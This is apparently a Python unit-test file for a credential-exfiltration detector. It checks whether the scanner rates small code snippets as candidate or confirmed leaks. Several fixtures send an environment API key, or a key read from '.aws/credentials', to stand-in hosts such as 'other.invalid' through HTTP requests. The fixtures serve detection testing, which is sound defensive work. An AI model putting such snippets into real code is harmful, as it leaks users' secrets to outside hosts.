"""Source-only literal return identity and conservative auth boundaries."""
import unittest
from test_qindun_certify import MODULE


class PythonTemplateReturnAuthTests(unittest.TestCase):
    def test_template_return_contracts(self):
        cases = [
            ("direct_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/?key={}\"\npattern=template()\nrequests.get(pattern.format(key))", ["candidate"], False),
            ("nested_call_receiver", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/?key={}\"\nrequests.get(template().format(key))", ["candidate"], False),
            ("identity_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef identity(value):\n    return value\npattern=identity(\"https://service.invalid/?key={}\")\nrequests.get(pattern.format(key))", ["candidate"], False),
            ("named_local_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    pattern=\"https://service.invalid/?key={}\"\n    return pattern\nrequests.get(template().format(key))", ["candidate"], False),
            ("same_multiple_returns", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    if choose:\n        return \"https://service.invalid/?key={}\"\n    return \"https://service.invalid/?key={}\"\nrequests.get(template().format(key))", ["candidate"], False),
            ("different_auth_returns", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    if choose:\n        return \"https://service.invalid/?key={}\"\n    return \"https://other.invalid/?token={}\"\nrequests.get(template().format(key))", ["confirmed"], False),
            ("mixed_returns", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    if choose:\n        return \"https://service.invalid/?key={}\"\n    return \"https://service.invalid/?dump={}\"\nrequests.get(template().format(key))", ["confirmed"], False),
            ("unknown_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    if choose:\n        return os.getenv(\"TEMPLATE\")\n    return \"https://service.invalid/?key={}\"\nrequests.get(template().format(key))", ["confirmed"], False),
            ("default_capture", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\npattern=\"https://service.invalid/?key={}\"\ndef template(value=pattern):\n    return value\npattern=\"https://service.invalid/?dump={}\"\nrequests.get(template().format(key))", ["candidate"], False),
            ("default_override", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template(value=\"https://service.invalid/?key={}\"):\n    return value\nrequests.get(template(\"https://service.invalid/?dump={}\").format(key))", ["confirmed"], False),
            ("multiple_calls", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template(value):\n    return value\nfirst=template(\"https://service.invalid/?key={}\")\nsecond=template(\"https://service.invalid/?dump={}\")\nrequests.get(first.format(key))\nrequests.get(second.format(key))", ["candidate","confirmed"], False),
            ("global_late_read", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\npattern=\"https://service.invalid/?dump={}\"\ndef template():\n    return pattern\npattern=\"https://service.invalid/?key={}\"\nrequests.get(template().format(key))", ["candidate"], False),
            ("global_rebind", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\npattern=\"https://service.invalid/?key={}\"\ndef template():\n    return pattern\nfirst=template()\npattern=\"https://service.invalid/?dump={}\"\nsecond=template()\nrequests.get(first.format(key))\nrequests.get(second.format(key))", ["candidate","confirmed"], False),
            ("nested_forward", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef outer(value):\n    def inner(pattern):\n        return pattern\n    return inner(value)\nrequests.get(outer(\"https://service.invalid/?key={}\").format(key))", ["candidate"], False),
            ("raw_body", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/?key={}\"\nurl=template().format(key)\nrequests.post(\"https://other.invalid\",data=url)", ["confirmed"], False),
            ("raw_log", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/?key={}\"\nurl=template().format(key)\nrequests.get(url)\nprint(url)", ["candidate"], True),
            ("mixed_file", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/?key={}\"\nrequests.get(template().format(key))\nrequests.post(\"https://other.invalid\",data=key)", ["candidate","confirmed"], False),
            ("fallthrough", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    if choose:\n        return \"https://service.invalid/?key={}\"\nrequests.get(template().format(key))", ["confirmed"], False),
            ("bare_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    if choose:\n        return\n    return \"https://service.invalid/?key={}\"\nrequests.get(template().format(key))", ["confirmed"], False),
            ("generator", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    yield \"public\"\n    return \"https://service.invalid/?key={}\"\nrequests.get(template().format(key))", ["confirmed"], False),
            ("async", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nasync def template():\n    return \"https://service.invalid/?key={}\"\nrequests.get(template().format(key))", ["confirmed"], False),
            ("transformed_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return transform(\"https://service.invalid/?key={}\")\nrequests.get(template().format(key))", ["confirmed"], False),
            ("dynamic_path", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/{model}?key={value}\"\nrequests.get(template().format(model=model,value=key))", ["confirmed"], False),
            ("credential_file", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/?key={}\"\nkey=open(\".aws/credentials\").read()\nrequests.get(template().format(key))", ["confirmed"], False),
            ("sequence", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/?key={}\"\nkey=[key]\nrequests.get(template().format(key))", ["confirmed"], False),
            ("response_url", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef template():\n    return \"https://service.invalid/?key={}\"\nreq=urllib.request.Request(template().format(key))\nresponse=urllib.request.urlopen(req)\nprint(response.url)", ["candidate"], True),
        ]
        for name, source, expected, output in cases:
            with self.subTest(name=name):
                hits, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNone(error)
                self.assertEqual(
                    sorted({h.disposition for h in hits
                            if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}), expected
                )
                self.assertEqual(
                    any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits), output
                )

